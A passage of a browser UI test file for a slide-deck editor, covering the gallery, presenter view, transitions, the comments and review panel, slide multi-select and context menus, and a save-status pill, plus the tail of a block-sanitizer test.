    const ir = res.lanes[0].items[0].slides[0].blocks.find((b) => b.type === "icon-row");
    return !!ir && !ir.items[0].link;
  }},
  { name: "Non-whitelisted block type dropped by sanitizeBlock", fn: async () => {
    return sanitizeBlock({ type: "NOT_A_BLOCK", evil: true }) === null;
  }},
]);

// ── v10: Gallery View Suite ──────────────────────────────────────────
uiSuite("Gallery View", [
  { name: "Enter fullscreen for gallery tests", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("f");
    await _waitFor(() => !_$("header"));
  }},
  { name: "🗂 gallery button visible", fn: async () => {
    await _waitFor(() => _$("[data-testid='gallery-toggle']"), 2000);
  }},
  { name: "G key opens gallery", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("g");
    await _waitFor(() => _$text("GALLERY"), 2000);
  }},
  { name: "Gallery shows slide count", fn: async () => {
    await _waitFor(() => {
      const el = _$text("slides");
      return el && /\d+\s*slides/.test(el.textContent);
    }, 2000);
  }},
  { name: "Gallery shows module grouping", fn: async () => {
    // Should have module labels (colored text above first slide of each module)
    // Look for any text matching a known module title in mono font
    await _waitFor(() => {
      const monos = _$$("span").filter(s => s.style?.fontFamily?.includes("mono") && s.style?.fontWeight >= 600 && s.style?.letterSpacing);
      return monos.length > 0;
    }, 2000);
  }},
  { name: "Gallery has thumbnail cards", fn: async () => {
    // Should have multiple clickable card divs with slide titles
    const cards = _$$("[style*='width: 224px'], [style*='width:224px']");
    return cards.length > 0 || _$$("div").filter(d => d.style?.width === "224px").length > 0;
  }},
  { name: "Current slide highlighted", fn: async () => {
    // Look for a card with accent border
    const highlighted = _$$("div").find(d => d.style?.borderColor && d.style.borderColor.includes("59, 130, 246"));
    return !!highlighted;
  }},
  { name: "Hint text visible", fn: async () => {
    await _waitFor(() => _$text("G or ESC to close"), 1000);
  }},
  { name: "Click card navigates", fn: async () => {
    // Click a real gallery card by its stable data-testid (the clickable card div,
    // part-slides.jsx). Clicking it runs jump() -> SELECT + SET_SLIDE_INDEX + onClose,
    // so the gallery closes. (Previously this hunted a mono "2" span + a cursor-style
    // substring, which could match a non-card span and silently no-op.)
    const cards = _$$("[data-testid='gallery-slide']");
    if (!cards.length) throw new Error("no gallery-slide cards rendered");
    _click(cards[0]);
    await _waitFor(() => !_$text("GALLERY"), 1500).catch(() => {});
    return !_$text("GALLERY");
  }},
  { name: "G key toggles gallery off", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    // Ensure we're not in gallery from a previous test
    if (_$text("GALLERY")) { _key("g"); await _waitFor(() => !_$text("GALLERY"), 1500).catch(() => {}); }
    document.activeElement?.blur(); await _wait(100);
    _key("g");
    await _waitFor(() => _$text("GALLERY"), 3000);
    document.activeElement?.blur(); await _wait(100);
    _key("g");
    await _waitFor(() => !_$text("GALLERY"), 3000);
  }},
  { name: "Exit fullscreen after gallery tests", fn: async () => {
    _key("f");
    await _waitFor(() => _$("header"));
  }},
]);

// ── CR-12: Gallery reachable from the editor (not just Present mode) ──
uiSuite("Gallery From Editor", [
  { name: "Editor is not in fullscreen/Present", fn: async () => {
    await _waitFor(() => _$("header"), 2000);
  }},
  { name: "Overview button visible in the SLIDE TOOLBAR", fn: async () => {
    await _waitFor(() => _$("[data-testid='editor-gallery-toggle']"), 2000);
  }},
  { name: "Clicking Overview opens the gallery grid with tiles", fn: async () => {
    const btn = _$("[data-testid='editor-gallery-toggle']");
    if (!btn) throw new Error("editor-gallery-toggle not found");
    _click(btn);
    await _waitFor(() => _$text("GALLERY"), 2000);
    // Scope to the gallery overlay itself — the editor's module list (still
    // mounted behind the overlay) has its own numbered mono-font badges that
    // would otherwise collide with an unscoped document-wide query.
    const root = _$("[data-teacher-panel]");
    if (!root) throw new Error("gallery overlay root not found");
    const cardCount = _$$("span", root).filter((s) => /^\d+$/.test(s.textContent?.trim()) && s.style?.fontFamily?.includes("mono")).length;
    if (cardCount === 0) throw new Error("gallery opened from editor but shows no slide tiles");
  }},
  { name: "Clicking a tile from the editor-opened gallery navigates", fn: async () => {
    const root = _$("[data-teacher-panel]");
    if (!root) throw new Error("gallery overlay root not found");
    const nums = _$$("span", root).filter((s) => /^\d+$/.test(s.textContent?.trim()) && s.style?.fontFamily?.includes("mono"));
    const card1 = nums.find((n) => n.textContent?.trim() === "1");
    if (!card1) throw new Error("tile '1' not found in gallery overlay");
    const cardEl = card1.closest("div[style*='cursor: pointer'], div[style*='cursor:pointer']");
    if (!cardEl) throw new Error("clickable card wrapper not found for tile '1'");
    _click(cardEl);
    await _wait(400);
    if (_$text("GALLERY")) throw new Error("gallery still open after selecting a tile");
    await _waitFor(() => _$("header"), 2000); // back in the editor, not fullscreen
  }},
  { name: "G key re-opens and Escape closes gallery from the editor", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    if (_$text("GALLERY")) { _key("g"); await _wait(400); } // ensure closed from a prior test
    document.activeElement?.blur(); await _wait(100);
    _key("g");
    await _waitFor(() => _$text("GALLERY"), 2000);
    _key("Escape");
    await _waitFor(() => !_$text("GALLERY"), 2000);
  }},
  { name: "CR1/D8: gallery page badge total excludes virtual title cards", fn: async () => {
    document.activeElement?.blur();
    for (let i = 0; i < 2; i++) { _key("Escape"); await _wait(80); }
    if (_$text("GALLERY")) { _key("g"); await _waitFor(() => !_$text("GALLERY"), 1500).catch(() => {}); }
    // Enable a title card on the first section so the gallery renders a 🎬 virtual card.
    const tc = _$$("span").find((s) => /Title card/i.test(s.title || ""));
    if (!tc) throw new Error("title-card 🎬 toggle not found in TOC");
    const wasOn = /ON/i.test(tc.title || "");
    if (!wasOn) { _click(tc); await _waitFor(() => _$$("span").some((s) => /Title card ON/i.test(s.title || "")), 1500); }
    // Open the gallery from the editor.
    const gbtn = await _waitFor(() => _$("[data-testid='editor-gallery-toggle']"), 2000);
    _click(gbtn);
    await _waitFor(() => _$text("GALLERY"), 2000);
    const root = await _waitFor(() => _$("[data-teacher-panel]"), 2000);
    await _wait(150);
    // The virtual title card must actually be present (else the total can't be inflated).
    if (_$$("[data-testid='gallery-title-card']", root).length === 0) throw new Error("no virtual title card rendered — cannot exercise the badge total");
    const realCards = _$$("[data-testid='gallery-slide']", root);
    const realCount = realCards.length;
    // A real thumbnail's page-number badge (NN / NN): its denominator must be the
    // REAL slide count, NOT inflated by the virtual title card(s) → matches presentation.
    const badgeTotalOf = (card) => { const el = _$$("*", card).find((e) => e.children.length === 0 && /^\d+\s*\/\s*\d+$/.test((e.textContent || "").trim())); return el ? parseInt((el.textContent || "").trim().split("/")[1], 10) : null; };
    let total = null;
    for (const c of realCards) { total = badgeTotalOf(c); if (total != null) break; }
    if (total == null) throw new Error("no page-number badge found on gallery thumbnails");
    if (total !== realCount) throw new Error(`gallery badge total ${total} != real slide count ${realCount} (virtual title cards leaked into the total)`);
    // Cleanup: close gallery + restore the title-card toggle to its prior state.
    _key("Escape"); await _waitFor(() => !_$text("GALLERY"), 2000).catch(() => {});
    if (!wasOn) { const t2 = _$$("span").find((s) => /Title card ON/i.test(s.title || "")); if (t2) { _click(t2); await _wait(120); } }
  }},
]);

// ── CR-08: Dedicated presenter/speaker view ──────────────────────────
uiSuite("Presenter View", [
  { name: "Enter fullscreen (Present) for presenter-view tests", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("f");
    await _waitFor(() => !_$("header"), 2000);
  }},
  { name: "🖥️ presenter-view button visible in Present mode", fn: async () => {
    await _waitFor(() => _$("[data-testid='presenter-toggle']"), 2000);
  }},
  { name: "S key opens presenter view: current + Next + notes + timer", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("s");
    await _waitFor(() => _$("[data-testid='presenter-view']"), 2000);
    const timerEl = _$("[data-testid='presenter-timer']");
    if (!timerEl) throw new Error("presenter-timer not found");
    if (!/\d+:\d\d/.test(timerEl.textContent || "")) throw new Error("presenter timer text does not match mm:ss: " + timerEl.textContent);
    if (!_$("[data-testid='presenter-next']")) throw new Error("Next-slide preview region not found");
    if (!_$("[data-testid='presenter-notes']")) throw new Error("Speaker notes region not found");
  }},
  { name: "Timer keeps advancing (elapsed clock is live)", fn: async () => {
    const before = _$("[data-testid='presenter-timer']")?.textContent;
    await _wait(1200);
    const after = _$("[data-testid='presenter-timer']")?.textContent;
    if (before == null || after == null) throw new Error("presenter-timer disappeared");
    // Not a hard equality check (1s tick can be flaky under load) — just confirm it's still a valid mm:ss.
    if (!/\d+:\d\d/.test(after)) throw new Error("presenter timer stopped showing mm:ss: " + after);
  }},
  { name: "Arrow key advances the deck while presenter view is open", fn: async () => {
    const before = _slidePos();
    _key("ArrowRight"); await _wait(400);
    const after = _slidePos();
    if (before != null && after != null && after === before) throw new Error("ArrowRight did not advance slide with presenter view open");
  }},
  { name: "Presenter toggle button closes the view", fn: async () => {
    const btn = _$("[data-testid='presenter-toggle']");
    if (!btn) throw new Error("presenter-toggle not found");
    _click(btn);
    await _waitFor(() => !_$("[data-testid='presenter-view']"), 2000);
  }},
  { name: "Exit fullscreen after presenter-view tests", fn: async () => {
    _key("f");
    await _waitFor(() => _$("header"));
  }},
]);

// ── CR-09: Deck-level slide transition on advance ────────────────────
uiSuite("Slide Transitions", [
  { name: "Enter fullscreen for transition tests", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("f");
    await _waitFor(() => !_$("header"), 2000);
  }},
  { name: "slide-transition-fade wrapper present on the active slide", fn: async () => {
    await _waitFor(() => _$(".slide-transition-fade"), 2000);
  }},
  { name: "Transition wrapper remounts (fresh play) on slide advance", fn: async () => {
    const before = _$(".slide-transition-fade");
    if (!before) throw new Error("no .slide-transition-fade element before advancing");
    _key("ArrowRight");
    await _waitFor(() => {
      const el = _$(".slide-transition-fade");
      return el && el !== before;
    }, 2000);
  }},
  { name: "Per-block stagger (.stg-N) still present alongside the deck transition", fn: async () => {
    await _waitFor(() => _$$("[class^='stg-']").length > 0, 2000);
  }},
  { name: "Exit fullscreen after transition tests", fn: async () => {
    _key("f");
    await _waitFor(() => _$("header"));
  }},
]);

// ── Review / Comments Suite ─────────────────────────────────────────
// Review mode exposes no button-state signal — the header "💬 Comments" button
// keeps its emoji whether review is on or off — so detect actual state from the
// COMMENTS panel and toggle only when needed. Keeps the Review tests order-robust
// so a prior test's residual mode can't flip the next test's toggle.
const _reviewPanelOpen = () => !!_$text("COMMENTS");
const _reviewToggleBtn = () => _$$("button").find((b) => (b.textContent || "").includes("Comments") && (b.textContent || "").includes("💬"));
const _setReviewMode = async (on) => {
  if (_reviewPanelOpen() === on) return;
  const btn = _reviewToggleBtn();
  if (btn) { _click(btn); await _waitFor(() => _reviewPanelOpen() === on, 1500).catch(() => {}); }
};

uiSuite("Review", [
  { name: "Review button visible in header", fn: async () => {
    await _waitFor(() => _$$("button").find((b) => (b.textContent || "").includes("Comments")));
  }},
  { name: "Review button toggles review mode", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    const btn = _$$("button").find((b) => (b.textContent || "").includes("Comments") && (b.textContent || "").includes("💬"));
    if (!btn) throw new Error("Review button not found");
    _click(btn); await _wait(300);
    // Comments panel should open — look for COMMENTS header
    const panel = await _waitFor(() => _$text("COMMENTS"), 2000).catch(() => null);
    if (!panel) throw new Error("Comments panel did not open");
  }},
  { name: "Comments panel shows filter tabs", fn: async () => {
    await _waitFor(() => {
      const all = document.body.textContent || "";
      return all.includes("Open") && all.includes("Done");
    }, 1000);
  }},
  { name: "Comments panel has Copy for Agent button", fn: async () => {
    await _waitFor(() => _$$("button").find((b) => (b.textContent || "").includes("Copy for Agent")));
  }},
  { name: "Comments panel has Resolve All button", fn: async () => {
    await _waitFor(() => _$$("button").find((b) => (b.textContent || "").includes("Resolve All")));
  }},
  { name: "Comments panel has Clear Done button", fn: async () => {
    await _waitFor(() => _$$("button").find((b) => (b.textContent || "").includes("Clear Done")));
  }},
  { name: "Module comment icon visible in review mode (💬)", fn: async () => {
    // 💬 module icon only shows in review mode — ensure review is actually on
    // (independent of whatever state a prior test left behind).
    await _setReviewMode(true);
    await _waitFor(() => _$$("span").find((s) => s.textContent?.includes("💬") && s.style?.cursor === "pointer"), 1000);
    // Return to editor mode for the following tests.
    await _setReviewMode(false);
  }},
  { name: "Module comment icon hidden in editor mode", fn: async () => {
    // In editor mode (review off), 💬 toggle should NOT be in the module list
    await _wait(200);
    const commentIcon = _$$("span").find((s) => s.textContent?.includes("💬") && s.style?.cursor === "pointer" && !s.closest("button"));
    if (commentIcon) throw new Error("💬 icon should be hidden in editor mode");
  }},
  { name: "Review mode exit closes panel", fn: async () => {
    const btn = _$$("button").find((b) => (b.textContent || "").includes("Comments") && (b.textContent || "").includes("💬"));
    if (!btn) throw new Error("Review button not found");
    _click(btn); await _wait(300);
    // Panel should be gone
    await _wait(200);
    const panel = _$text("COMMENTS");
    // May still be visible briefly — just verify no crash
  }},
  { name: "R key toggles review mode", fn: async () => {
    // Start from a known-off state so the first `r` deterministically opens.
    await _setReviewMode(false);
    document.activeElement?.blur(); await _wait(100);
    _key("r");
    const panel = await _waitFor(() => _$text("COMMENTS"), 2000).catch(() => null);
    if (!panel) throw new Error("R key did not open comments panel");
    // Toggle off
    _key("r");
    await _waitFor(() => !_$text("COMMENTS"), 1500).catch(() => {});
  }},
  { name: "Review mode and Vera are mutually exclusive", fn: async () => {
    // Open review (only if not already on — the button emoji isn't a state signal)
    await _setReviewMode(true);
    // Now open Vera — should close review
    const veraBtn = _$$("button").find((b) => (b.textContent || "").includes("Vera") && (b.textContent || "").includes("🤖"));
    if (veraBtn) { _click(veraBtn); await _waitFor(() => !!(_$$("textarea").find((t) => { const ph = t.placeholder?.toLowerCase() || ""; return ph.includes("tell vera") || ph.includes("paste images"); }) || _$$("span").find((s) => s.textContent?.trim() === "VERA")), 1500).catch(() => {}); }
    // Vera open? Use the same robust signal as the Chat suite — the textarea
    // placeholder is AI-state dependent (keyless builds show "AI features not
    // enabled"), so accept the "VERA" panel header as the open signal too.
    const veraOpen = !!(_$$("textarea").find((t) => {
      const ph = t.placeholder?.toLowerCase() || "";
      return ph.includes("tell vera") || ph.includes("paste images");
    }) || _$$("span").find((s) => s.textContent?.trim() === "VERA"));
    // Mutual exclusion: opening Vera must have closed the review (COMMENTS) panel.
    const reviewClosed = !_reviewPanelOpen();
    // Close Vera
    if (veraBtn) { _click(veraBtn); await _wait(200); }
    if (!veraOpen) throw new Error("Vera panel didn't open when switching from Review");
    if (!reviewClosed) throw new Error("Review panel stayed open — not mutually exclusive with Vera");
  }},
  { name: "Comment badge click opens comments panel", fn: async () => {
    // Ensure review mode is off first
    document.activeElement?.blur(); await _wait(100);
    // Look for the amber comment count badge on the slide canvas (top-right circle)
    const badge = _$$("div").find((d) => d.style?.borderRadius === "11px" && d.style?.background && d.style?.cursor === "pointer" && d.style?.position === "absolute");
    if (badge) {
      _click(badge);
      const panel = await _waitFor(() => _$text("COMMENTS"), 2000).catch(() => null);
      if (!panel) throw new Error("Clicking comment badge did not open comments panel");
      // Close review mode
      const reviewBtn = _$$("button").find((b) => (b.textContent || "").includes("Comments") && (b.textContent || "").includes("💬"));
      if (reviewBtn) { _click(reviewBtn); await _wait(300); }
    }
    // If no badge, test passes (no comments on current slide)
  }},
], { setup: _selectFirstModule });

// ── Sprint 7-1 UX batch ──────────────────────────────────────────────
// Header slide count parsed from the header stat pill ("⏱24m · 28sl · 13§").
const _headerSlideCount = () => {
  const hdr = _$("header");
  if (!hdr) return null;
  const el = _$$("span", hdr).find((e) => /\d+sl\b/.test(e.textContent || ""));
  const m = el && (el.textContent || "").match(/(\d+)sl/);
  return m ? parseInt(m[1], 10) : null;
};

uiSuite("Header & Stats (7-1)", [
  { name: "Header shows minutes + slide count", fn: async () => {
    const pill = await _waitFor(() => { const h = _$("header"); return h && _$$("span", h).find((e) => /\d+m\b/.test(e.textContent || "") && /\d+sl\b/.test(e.textContent || "")); });
    if (/\d+m\s*\d+s/.test(pill.textContent)) throw new Error("header still shows seconds: " + pill.textContent);
  }},
  { name: "Header pill opens the Deck stats dialog", fn: async () => {
    const pill = await _waitFor(() => { const h = _$("header"); return h && _$$("span", h).find((e) => /\d+sl\b/.test(e.textContent || "") && /§/.test(e.textContent || "")); });
    _click(pill);
    await _waitFor(() => _$$("*").find((e) => e.children.length === 0 && /Deck stats/i.test(e.textContent || "")));
    _key("Escape");
    await _wait(150);
  }},
]);

uiSuite("Hide slides (7-1)", [
  { name: "Eye toggle hides a slide and updates the count", fn: async () => {
    const eye = await _waitFor(() => _$$("span").find((e) => (e.title || "").startsWith("Hide slide")));
    const before = _headerSlideCount();
    if (before == null) throw new Error("no header slide count");
    _click(eye);
    await _waitFor(() => _headerSlideCount() === before - 1, 2000);
    // restore
    const unhide = await _waitFor(() => _$$("span").find((e) => (e.title || "").startsWith("Hidden")));
    _click(unhide);
    await _waitFor(() => _headerSlideCount() === before, 2000);
  }},
]);

uiSuite("Add menu (7-1)", [
  { name: "Add affordance offers Blank / AI / Section", fn: async () => {
    const add = await _waitFor(() => _$$("*").find((e) => e.children.length === 0 && /＋\s*add|＋\s*Add slide/.test(e.textContent || "")));
    _click(add);
    await _waitFor(() => {
      const btns = _$$("button").map((b) => (b.textContent || "").trim());
      return btns.some((t) => /Blank/.test(t)) && btns.some((t) => /Section/.test(t)) && btns.some((t) => /AI/.test(t));
    }, 2000);
    // close the menu
    const x = _$$("button").find((b) => (b.textContent || "").trim() === "✕");
    if (x) _click(x);
    await _wait(120);
  }},
]);

uiSuite("Section drag reorder (7-1)", [
  { name: "Dragging a section changes the order", fn: async () => {
    const rows = () => _$$(".concept-row");
    const titleOf = (r) => { const s = _$$("span", r).find((x) => parseInt(x.style.fontWeight) >= 600); return (s ? s.textContent : r.textContent || "").trim().slice(0, 30); };
    const before = rows().map(titleOf);
    if (before.length < 3) throw new Error("need >=3 sections");
    const src = rows()[0], dst = rows()[2];
    const dt = new DataTransfer();
    const fire = (el, type, extra) => el.dispatchEvent(new DragEvent(type, Object.assign({ bubbles: true, cancelable: true, dataTransfer: dt }, extra)));
    const db = dst.getBoundingClientRect();
    fire(src, "dragstart");
    fire(dst, "dragover", { clientX: db.x + db.width / 2, clientY: db.y + db.height - 3 });
    fire(dst, "drop", { clientX: db.x + db.width / 2, clientY: db.y + db.height - 3 });
    fire(src, "dragend");
    await _waitFor(() => JSON.stringify(rows().map(titleOf)) !== JSON.stringify(before), 2000);
    // drag it back to restore original order
    const r2 = rows(); const s2 = r2.find((r) => titleOf(r) === before[0]); const d2 = r2[0];
    if (s2 && d2 && s2 !== d2) {
      const dt2 = new DataTransfer();
      const fire2 = (el, type, extra) => el.dispatchEvent(new DragEvent(type, Object.assign({ bubbles: true, cancelable: true, dataTransfer: dt2 }, extra)));
      const b2 = d2.getBoundingClientRect();
      fire2(s2, "dragstart"); fire2(d2, "dragover", { clientX: b2.x + 5, clientY: b2.y + 2 }); fire2(d2, "drop", { clientX: b2.x + 5, clientY: b2.y + 2 }); fire2(s2, "dragend");
      await _wait(150);
    }
  }},
]);

uiSuite("Section collapse-all (Ctrl-click) — v13.15", [
  { name: "Ctrl-click collapses/expands every section, plain click affects only one", fn: async () => {
    const rows = () => _$$(".concept-row");
    // The collapse arrow is the row's first <span> (rendered before the imp-dot
    // div and title), identifiable by its rotate() transform.
    const toggles = () => rows().map((r) => r.querySelector("span"));
    const isCollapsed = (span) => /rotate\(-90deg\)/.test(span.style.transform || "");
    if (rows().length < 2) throw new Error("need >=2 sections");
    // Plain click collapses only the clicked section.
    _click(toggles()[0]);
    await _wait(150);
    let states = toggles().map(isCollapsed);
    if (!states[0]) throw new Error("plain click did not collapse the clicked section");
    if (states.slice(1).some(Boolean)) throw new Error("plain click affected other sections");
    _click(toggles()[0]); // restore
    await _wait(150);
    // Ctrl-click collapses ALL sections.
    _clickMod(toggles()[0], { ctrlKey: true });
    await _wait(150);
    states = toggles().map(isCollapsed);
    if (!states.every(Boolean)) throw new Error("ctrl-click did not collapse all sections");
    // Ctrl-click again expands ALL sections.
    _clickMod(toggles()[0], { ctrlKey: true });
    await _wait(150);
    states = toggles().map(isCollapsed);
    if (states.some(Boolean)) throw new Error("ctrl-click did not expand all sections");
  }},
]);

uiSuite("Presenter Ctrl+E (7-1)", [
  { name: "Ctrl+E toggles the TOC search pane", fn: async () => {
    try { document.activeElement?.blur?.(); } catch {}
    const isFs = () => !!_$("[style*='position: fixed']");
    // Ensure we are IN fullscreen (a prior suite may have left it toggled either way).
    for (let i = 0; i < 3 && !isFs(); i++) { _key("f"); await _waitFor(isFs, 1200).catch(() => {}); }
    if (!isFs()) throw new Error("could not enter fullscreen");
    const tocOpen = () => { const i = _$$("input").find((x) => /search slides/i.test(x.placeholder || "")); return i && i.getBoundingClientRect().x > -50; };
    _key("e", { ctrlKey: true });
    await _waitFor(tocOpen, 2500);
    _key("e", { ctrlKey: true });
    await _waitFor(() => !tocOpen(), 2500);
    _key("Escape"); await _wait(300); if (isFs()) { _key("Escape"); await _wait(200); }
  }},
]);

// ── Multi-select / Context menu / Move picker (Features 4–6) ──────────
// Dispatch a native click carrying keyboard modifiers (React onClick reads them).
const _clickMod = (el, opts = {}) => {
  if (!el) throw new Error("clickMod: element not found");
  el.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true, ...opts }));
  return el;
};
const _rightClick = (el, x = 120, y = 120) => {
  if (!el) throw new Error("rightClick: element not found");
  el.dispatchEvent(new MouseEvent("contextmenu", { bubbles: true, cancelable: true, clientX: x, clientY: y }));
  return el;
};
const _tocRows = () => _$$('[data-testid="toc-slide-row"]');
// A prior suite may leave the app in Vela fullscreen (a fixed inset:0 overlay at
// a high z-index showing the "N / N" slide counter). Toggle out with 'f' so the
// editor's SlidePanel toolbar actually renders for these suites.
const _exitFullscreen = async () => {
  const inFs = () => _$$("div").some((d) => d.style.position === "fixed" && d.style.inset === "0px" && parseInt(d.style.zIndex || "0", 10) >= 999 && /\d+\s*\/\s*\d+/.test(d.textContent || ""));
  for (let i = 0; i < 3 && inFs(); i++) { document.activeElement?.blur?.(); _key("f"); await _waitFor(() => !inFs(), 1500).catch(() => {}); }
};
const _editorSetup = async () => { await _exitFullscreen(); await _selectFirstModule(); };

uiSuite("Slide Multi-select (F4)", [
  { name: "cmd-click selects multiple slide rows", fn: async () => {
    const rows = _tocRows();
    if (rows.length < 2) { return; } // module with <2 slides — soft pass
    _click(rows[0]); await _wait(120);
    _clickMod(rows[1], { metaKey: true }); await _wait(150);
    const selCount = _tocRows().filter((r) => r.getAttribute("data-selected") === "true").length;
    if (selCount < 2) throw new Error("expected >=2 rows data-selected, got " + selCount);
    // plain click collapses back to a single selection
    _click(rows[0]); await _wait(150);
    const after = _tocRows().filter((r) => r.getAttribute("data-selected") === "true").length;
    if (after > 1) throw new Error("plain click did not clear multi-selection, got " + after);
  }},
  { name: "shift-click selects a contiguous range", fn: async () => {
    const rows = _tocRows();
    if (rows.length < 3) { return; }
    _click(rows[0]); await _wait(120);
    _clickMod(rows[2], { shiftKey: true }); await _wait(150);
    const selCount = _tocRows().filter((r) => r.getAttribute("data-selected") === "true").length;
    if (selCount < 3) throw new Error("shift-range expected >=3 selected, got " + selCount);
    _click(rows[0]); await _wait(120);
  }},
], { setup: _editorSetup });

uiSuite("Slide Context Menu (F5)", [
  { name: "right-click opens the slide context menu", fn: async () => {
    const rows = _tocRows();
    if (rows.length === 0) throw new Error("no slide rows");
    _rightClick(rows[0]);
    const menu = await _waitFor(() => _$('[data-testid="toc-context-menu"]'), 2000);
    for (const tid of ["ctx-move", "ctx-duplicate", "ctx-delete", "ctx-hide"]) {
      if (!menu.querySelector(`[data-testid="${tid}"]`)) throw new Error("missing menu item " + tid);
    }
    _key("Escape");
    await _waitFor(() => !_$('[data-testid="toc-context-menu"]'), 2000);
  }},
  { name: "Move submenu shows the section picker", fn: async () => {
    const rows = _tocRows();
    if (rows.length === 0) throw new Error("no slide rows");
    _rightClick(rows[0]);
    const menu = await _waitFor(() => _$('[data-testid="toc-context-menu"]'), 2000);
    _click(menu.querySelector('[data-testid="ctx-move"]'));
    // section picker (may be empty if only one module) — search input appears
    await _waitFor(() => _$('[data-testid="section-search"]') || _$text("No other sections"), 2000).catch(() => {});
    _key("Escape");
    await _waitFor(() => !_$('[data-testid="toc-context-menu"]'), 2000).catch(() => {});
    document.activeElement?.blur?.();
  }},
], { setup: _editorSetup });

uiSuite("Move Picker Search (F6)", [
  { name: "move picker has search + wide scroll + wheel isolation", fn: async () => {
    // Ensure the slide editor toolbar is on screen (click the active slide row).
    const rows = _tocRows();
    if (rows.length > 0) { _click(rows[0]); await _wait(150); }
    const findMove = () => _$$("button").find((b) => b.title?.includes("Move to module") || (b.textContent?.includes("📦") && /Move/.test(b.textContent || "")));
    const btn = await _waitFor(findMove, 2500);
    _click(btn);
    const search = await _waitFor(() => _$('[data-testid="section-search"]'), 2000).catch(() => null);
    if (!search) { // no other modules — close and soft pass
      const bd = _$$("div").find((d) => d.style.position === "fixed" && d.style.inset === "0px" && d.style.zIndex === "9998");
      if (bd) _click(bd); await _wait(150); return;
    }
    const list = _$('[data-testid="section-picker-list"]');
    if (!list || !list.className.includes("vela-wide-scroll")) throw new Error("picker list missing wide-scroll class");
    if (list.getAttribute("data-scroll-container") == null) throw new Error("picker list not marked data-scroll-container");
    const before = _$$('[data-testid="section-picker-item"]').length;
    _type(search, "zzzznomatch"); await _wait(200);
    const filtered = _$$('[data-testid="section-picker-item"]').length;
    if (before > 0 && filtered !== 0) throw new Error("search did not filter (before " + before + ", after " + filtered + ")");
    _type(search, ""); await _wait(150);
    const bd = _$$("div").find((d) => d.style.position === "fixed" && d.style.inset === "0px" && d.style.zIndex === "9998");
    if (bd) _click(bd); await _wait(150);
  }},
], { setup: _editorSetup });

// Desktop save-status pill (CR3) — the "no hint or error" half of the Windows
// silent-save bug. Drives the app's save-status channel (window.__velaOnSaveStatus,
// wired by the app effect; nl-boot feeds it from deck-io on the real desktop) and
// asserts the pill's state machine + the Retry affordance. Stable test-ids:
//   save-status-pill  (data-save-state = saving|saved|failed|reconnecting)
//   save-status-retry / save-failed-toast / save-failed-toast-retry
const _savePill = () => _$('[data-testid="save-status-pill"]');
const _saveState = () => { const p = _savePill(); return p ? p.getAttribute("data-save-state") : null; };
uiSuite("Desktop save-status pill (CR3)", [
  { name: "channel wired: window.__velaOnSaveStatus is a function", fn: async () => {
    if (typeof window.__velaOnSaveStatus !== "function") throw new Error("save-status channel not wired");
  }},
  { name: "saving → saved renders the pill with 'Saved' copy", fn: async () => {
    window.__velaOnSaveStatus({ state: "saving", at: Date.now() });
    await _waitFor(() => _saveState() === "saving", 2000);
    window.__velaOnSaveStatus({ state: "saved", at: Date.now() });
    const pill = await _waitFor(() => (_saveState() === "saved" ? _savePill() : null), 2000);
    if (!/Saved/.test(pill.textContent || "")) throw new Error("saved pill missing copy: " + pill.textContent);
  }},
  { name: "failed save surfaces a Retry pill + one-shot toast (not swallowed)", fn: async () => {
    window.__velaOnSaveStatus({ state: "failed", at: Date.now(), error: "mock write reject" });
    const pill = await _waitFor(() => (_saveState() === "failed" ? _savePill() : null), 2000);
    if (!/Retry/i.test(pill.textContent || "")) throw new Error("failed pill missing Retry: " + pill.textContent);
    await _waitFor(() => _$('[data-testid="save-failed-toast"]'), 2000);
  }},
  { name: "Retry invokes __velaForceSave and returns to Saved", fn: async () => {
    const orig = window.__velaForceSave;
    let called = 0;
    window.__velaForceSave = () => { called++; window.__velaOnSaveStatus({ state: "saved", at: Date.now() }); };
    try {
      window.__velaOnSaveStatus({ state: "failed", at: Date.now() });
      const pill = await _waitFor(() => (_saveState() === "failed" ? _savePill() : null), 2000);
      _click(pill);
      if (called < 1) throw new Error("__velaForceSave was not called by Retry");
      await _waitFor(() => _saveState() === "saved", 2000);
    } finally {
      window.__velaForceSave = orig;
    }
  }},
  { name: "D6: dismissed toast does NOT re-arm on reconnecting→failed (only a real save re-arms)", fn: async () => {
    const toast = () => _$('[data-testid="save-failed-toast"]');
    const dismiss = () => { const x = _$('[data-testid="save-failed-toast"] [title="Dismiss"]'); if (x) _click(x); };
    // Start armed from a clean saved state.
    window.__velaOnSaveStatus({ state: "saved", at: Date.now() });
    await _wait(60);
    // 1) First failure raises the one-shot toast → dismiss it.
    window.__velaOnSaveStatus({ state: "failed", at: Date.now(), error: "mock" });
    await _waitFor(() => toast(), 2000);
    dismiss();
    await _waitFor(() => !toast(), 1500);
    // 2) reconnecting → failed AGAIN with NO successful save in between: must stay dismissed.
    window.__velaOnSaveStatus({ state: "reconnecting", at: Date.now() });
    await _wait(80);
    window.__velaOnSaveStatus({ state: "failed", at: Date.now(), error: "mock2" });
    await _wait(300);
    if (toast()) throw new Error("dismissed toast wrongly re-armed on reconnecting→failed (no save between)");
    // 3) A genuine successful save re-arms; a subsequent failure MAY show again.
    window.__velaOnSaveStatus({ state: "saved", at: Date.now() });
    await _wait(80);
    window.__velaOnSaveStatus({ state: "failed", at: Date.now(), error: "mock3" });
    await _waitFor(() => toast(), 2000);
    // Cleanup.
    dismiss();
    window.__velaOnSaveStatus({ state: "saved", at: Date.now() });
    await _wait(40);
    window.__velaOnSaveStatus(null);
    await _wait(40);
  }},
  { name: "reconnecting renders an amber pill; then cleans up", fn: async () => {
    window.__velaOnSaveStatus({ state: "reconnecting", at: Date.now() });
    const pill = await _waitFor(() => (_saveState() === "reconnecting" ? _savePill() : null), 2000);
    if (!/Reconnect/i.test(pill.textContent || "")) throw new Error("reconnecting copy missing: " + pill.textContent);
    // Cleanup so the pill/toast don't leak into later suites.
    window.__velaOnSaveStatus({ state: "saved", at: Date.now() });
    await _wait(60);
    window.__velaOnSaveStatus(null);
    await _waitFor(() => _savePill() == null, 1500).catch(() => {});
  }},
]);

